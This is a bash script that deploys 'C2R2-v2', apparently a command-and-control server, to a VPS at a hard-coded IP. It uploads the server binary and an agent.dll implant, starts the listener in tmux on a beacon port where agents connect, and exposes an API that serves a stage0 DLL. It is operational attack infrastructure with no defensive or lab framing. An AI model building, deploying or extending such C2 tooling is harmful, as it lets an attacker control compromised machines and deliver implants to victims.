#!/usr/bin/env bash
# deploy-detached.sh — Manual VPS deploy that starts c2r2-server inside tmux
#
# Usage:
#   ./deploy-detached.sh
#   ./deploy-detached.sh --ip 45.154.98.72 --port 4444 --api-port 5555
#   ./deploy-detached.sh --skip-agent
#   ./deploy-detached.sh --skip-server
#
# What it does:
#   1. SCP dist/agent.dll          -> VPS dist/agent.dll
#   2. SCP dist/c2r2-server-x86_64 -> VPS c2r2-server
#   3. Kill existing server process
#   4. Start server inside:  tmux new-session -d -s c2r2
#
# Interactive console after deploy:
#   ssh root@<ip> -t 'tmux attach -t c2r2'

set -euo pipefail

# ---------------------------------------------------------------------------
# Defaults
# ---------------------------------------------------------------------------
VPS_IP="45.154.98.72"
VPS_USER="root"
VPS_DIR="~/c2r2"
PORT=4444
API_PORT=5555
SKIP_AGENT=0
SKIP_SERVER=0
DIST_DIR="$(cd "$(dirname "$0")" && pwd)/dist"
TMUX_SESSION="c2r2"

# ---------------------------------------------------------------------------
# Parse args
# ---------------------------------------------------------------------------
while [[ $# -gt 0 ]]; do
    case "$1" in
        --ip)        VPS_IP="$2";       shift 2 ;;
        --port)      PORT="$2";         shift 2 ;;
        --api-port)  API_PORT="$2";     shift 2 ;;
        --user)      VPS_USER="$2";     shift 2 ;;
        --dir)       VPS_DIR="$2";      shift 2 ;;
        --skip-agent)  SKIP_AGENT=1;    shift   ;;
        --skip-server) SKIP_SERVER=1;   shift   ;;
        -h|--help)
            sed -n '2,/^$/p' "$0" | grep '^#' | sed 's/^# \{0,1\}//'
            exit 0
            ;;
        *) echo "Unknown option: $1"; exit 1 ;;
    esac
done

TARGET="${VPS_USER}@${VPS_IP}"

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
step() { echo; echo "==> $*"; echo "------------------------------------------------------------"; }
die()  { echo "FATAL: $*" >&2; exit 1; }

echo
echo "#====================================================="
echo "#  C2R2-v2  deploy-detached (tmux)                  "
echo "#====================================================="
echo "  Target  : ${TARGET}"
echo "  VPS Dir : ${VPS_DIR}"
echo "  C2      : ${VPS_IP}:${PORT}  API:${API_PORT}"
echo "  tmux    : session '${TMUX_SESSION}'"
echo

# ---------------------------------------------------------------------------
# Sanity checks
# ---------------------------------------------------------------------------
if [[ $SKIP_AGENT -eq 0 ]]; then
    [[ -f "${DIST_DIR}/agent.dll" ]] \
        || die "dist/agent.dll not found — run build-multistage.ps1 or deploy.ps1 first"
fi
if [[ $SKIP_SERVER -eq 0 ]]; then
    [[ -f "${DIST_DIR}/c2r2-server-x86_64" ]] \
        || die "dist/c2r2-server-x86_64 not found — run deploy.ps1 (or WSL build) first"
fi

# ---------------------------------------------------------------------------
# SSH connectivity check
# ---------------------------------------------------------------------------
step "Checking SSH connectivity"
ssh -o ConnectTimeout=8 -o BatchMode=yes "${TARGET}" "echo ok" \
    || die "SSH to ${TARGET} failed — check connectivity and key auth"
echo "  SSH OK"

# ---------------------------------------------------------------------------
# Stop running server
# ---------------------------------------------------------------------------
step "Stopping existing c2r2-server (if any)"
ssh "${TARGET}" "
    tmux kill-session -t ${TMUX_SESSION} 2>/dev/null && echo '  tmux session killed' || true
    pkill -f 'c2r2-server' 2>/dev/null && echo '  process killed' || true
    sleep 1
    echo '  done'
"

# ---------------------------------------------------------------------------
# Upload artifacts
# ---------------------------------------------------------------------------
if [[ $SKIP_SERVER -eq 0 ]]; then
    step "Uploading c2r2-server"
    scp "${DIST_DIR}/c2r2-server-x86_64" "${TARGET}:${VPS_DIR}/c2r2-server"
    ssh "${TARGET}" "chmod +x ${VPS_DIR}/c2r2-server"
    echo "  -> c2r2-server uploaded + chmod +x"
else
    echo "[skip] Server upload skipped (--skip-server)"
fi

if [[ $SKIP_AGENT -eq 0 ]]; then
    step "Uploading agent.dll"
    scp "${DIST_DIR}/agent.dll" "${TARGET}:${VPS_DIR}/dist/agent.dll"
    REMOTE_SIZE=$(ssh "${TARGET}" "stat -c%s ${VPS_DIR}/dist/agent.dll")
    echo "  -> dist/agent.dll : $(( REMOTE_SIZE / 1024 )) KB"
else
    echo "[skip] agent.dll upload skipped (--skip-agent)"
fi

# ---------------------------------------------------------------------------
# Start server inside tmux (has full TTY for rustyline interactive CLI)
# ---------------------------------------------------------------------------
step "Starting c2r2-server in tmux session '${TMUX_SESSION}'"

LAUNCH_CMD="mkdir -p ${VPS_DIR}/logs && ${VPS_DIR}/c2r2-server --bind 0.0.0.0 --port ${PORT} --api-port ${API_PORT} 2>&1 | tee -a ${VPS_DIR}/logs/server.log"

ssh "${TARGET}" "tmux new-session -d -s ${TMUX_SESSION} '${LAUNCH_CMD}'"
sleep 3

# ---------------------------------------------------------------------------
# Verify
# ---------------------------------------------------------------------------
step "Verification"

PID_CHECK=$(ssh "${TARGET}" "pgrep -la c2r2-server 2>/dev/null" || true)
if [[ -n "${PID_CHECK}" ]]; then
    echo "  c2r2-server running: ${PID_CHECK}"
else
    echo "  WARNING: c2r2-server may not have started!"
    ssh "${TARGET}" "tail -20 ${VPS_DIR}/logs/server.log 2>/dev/null || true"
fi

PORTS=$(ssh "${TARGET}" "ss -tlnp 2>/dev/null | grep -E ':${PORT}|:${API_PORT}'" || true)
if [[ -n "${PORTS}" ]]; then
    echo "  Ports listening:"
    echo "${PORTS}" | sed 's/^/    /'
fi

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
echo
echo "#====================================================="
echo "#  DEPLOY COMPLETE"
echo "#====================================================="
echo
echo "  VPS    : ${TARGET}"
echo "  Beacon : ${VPS_IP}:${PORT}   (TLS, agent connects here)"
echo "  API    : http://${VPS_IP}:${API_PORT}  (team-client / stage0 DLL)"
echo
echo "Last 5 log lines:"
ssh "${TARGET}" "tail -5 ${VPS_DIR}/logs/server.log 2>/dev/null || echo '(no log yet)'"
echo
echo "Attach to interactive server console:"
echo "  ssh ${TARGET} -t 'tmux attach -t ${TMUX_SESSION}'"
echo
